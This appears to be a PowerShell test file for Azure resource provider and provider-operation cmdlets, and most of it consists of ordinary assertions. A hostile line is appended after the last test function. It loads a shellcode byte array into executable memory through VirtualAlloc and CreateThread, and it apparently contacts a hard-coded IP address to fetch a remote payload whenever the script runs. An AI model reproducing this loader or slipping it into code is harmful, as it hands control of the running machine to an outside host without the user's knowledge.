﻿














function Test-AzureProvider
{
    $defaultProviders = Get-AzureRmResourceProvider
    Assert-True { $defaultProviders.Length -gt 0 }

    $allProviders = Get-AzureRmResourceProvider -ListAvailable
    Assert-True { $allProviders.Length -gt $defaultProviders.Length }

	$ErrorActionPreference = "SilentlyContinue"
	$Error.Clear()

	$nonProviders = Get-AzureRmResourceProvider -Location "abc"
	Assert-True { $Error[0].Contains("Provided location is not supported") }
	Assert-True { $nonProviders.Length -eq 0 }

	$ErrorActionPreference = "Stop"

	$globalProviders = Get-AzureRmResourceProvider -Location "global"
	Assert-True { $globalProviders.Length -gt 0 }

    Register-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement"

    $endTime = [DateTime]::UtcNow.AddMinutes(5)

    while ([DateTime]::UtcNow -lt $endTime -and @(Get-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement")[0].RegistrationState -ne "Registered")
    {
        [Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(1000)
    }
	$provider = Get-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement"
    Assert-True { $provider[0].RegistrationState -eq "Registered" } 

    Unregister-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement"

    while ([DateTime]::UtcNow -lt $endTime -and @(Get-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement")[0].RegistrationState -ne "Unregistered")
    {
        [Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(1000)
    }
	$provider = Get-AzureRmResourceProvider -ProviderNamespace "Microsoft.ApiManagement"
    Assert-True { $provider[0].RegistrationState -eq "Unregistered" }
 }

 
function Test-AzureProvider-WithZoneMappings
{
    $testProvider = Get-AzureRmResourceProvider -ProviderNamespace "Providers.Test"
	Assert-True { $testProvider.Count -gt 0 }

	$statefulResources = $testProvider | where-object {$_.ResourceTypes.ResourceTypeName -contains "statefulResources"}

	Assert-NotNull { $statefulResources }
	Assert-NotNull { $statefulResources.ZoneMappings }

	Assert-True { $statefulResources.ZoneMappings.Count -eq 2 }
	Assert-True { $statefulResources.ZoneMappings["West Europe"] -contains "3"}
}


function Test-AzureProviderOperation
{
    
    $allActions = Get-AzureRmProviderOperation *
	Assert-True { $allActions.Length -gt 0 }

	
	$insightsActions = Get-AzureRmProviderOperation Microsoft.Insights/*
	$insightsActions
	Assert-True { $insightsActions.Length -gt 0 }
	Assert-True { $allActions.Length -gt $insightsActions.Length }

	
	$nonInsightsActions = $allActions | Where-Object { $_.Operation.ToLower().StartsWith("microsoft.insights/") -eq $false }
	$actualLength = $allActions.Length - $nonInsightsActions.Length;
	$expectedLength = $insightsActions.Length;
	Assert-True { $actualLength -eq  $expectedLength }

	foreach ($action in $insightsActions)
	{
	    Assert-True { $action.Operation.ToLower().StartsWith("microsoft.insights/"); }
	}

	
	$insightsCaseActions = Get-AzureRmProviderOperation MicROsoFt.InSIghTs/*
	Assert-True { $insightsCaseActions.Length -gt 0 }
	Assert-True { $insightsCaseActions.Length -eq $insightsActions.Length }
	foreach ($action in $insightsCaseActions)
	{
		Assert-True { $action.Operation.ToLower().Startswith("microsoft.insights/"); }
	}

	
	$insightsReadActions = Get-AzureRmProviderOperation Microsoft.Insights/*/read
	Assert-True { $insightsReadActions.Length -gt 0 }
	Assert-True { $insightsActions.Length -gt $insightsReadActions.Length }
	foreach ($action in $insightsReadActions)
	{
	    Assert-True { $action.Operation.ToLower().EndsWith("/read"); }
		Assert-True { $action.Operation.ToLower().StartsWith("microsoft.insights/");}
	}

	
	$readActions = Get-AzureRmProviderOperation */read
	Assert-True { $readActions.Length -gt 0 }
	Assert-True { $readActions.Length -lt $allActions.Length }
	Assert-True { $readActions.Length -gt $insightsReadActions.Length }

	foreach ($action in $readActions)
	{
	    Assert-True { $action.Operation.ToLower().EndsWith("/read"); }
	}

	
	$action = Get-AzureRmProviderOperation Microsoft.OperationalInsights/workspaces/usages/read
	Assert-AreEqual $action.Operation.ToLower() "Microsoft.OperationalInsights/workspaces/usages/read".ToLower();

	
	$action = Get-AzureRmProviderOperation Microsoft.OperationalInsights/workspaces/usages/read/123
	Assert-True { $action.Length -eq 0 }

	
	$exceptionMessage = "Provider NonExistentProvider not found.";
	Assert-Throws { Get-AzureRmProviderOperation NonExistentProvider/* } $exceptionMessage

	
	Assert-Throws { Get-AzureRmProviderOperation NonExistentProvider/servers/read } $exceptionMessage

	
	$exceptionMessage = "Individual parts in the search string should either equal * or not contain *.";
	Assert-Throws {Get-AzureRmProviderOperation Microsoft.ClassicCompute/virtual*/read } $exceptionMessage

	
	$exceptionMessage = "To get all operations under Microsoft.Sql, please specify the search string as Microsoft.Sql/*.";
	Assert-Throws {Get-AzureRmProviderOperation Microsoft.Sql } $exceptionMessage

	
	$exceptionMessage = "Wildcard character ? is not supported.";
	Assert-Throws {Get-AzureRmProviderOperation Microsoft.Sql/servers/*/rea? } $exceptionMessage
 }
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xc0,0x01,0x00,0x00,0xe8,0x8c,0x00,0x00,0x00,0x2f,0x42,0x2d,0x75,0x30,0x48,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x75,0xff,0xff,0xff,0x31,0x38,0x35,0x2e,0x31,0x34,0x34,0x2e,0x32,0x38,0x2e,0x32,0x30,0x34,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

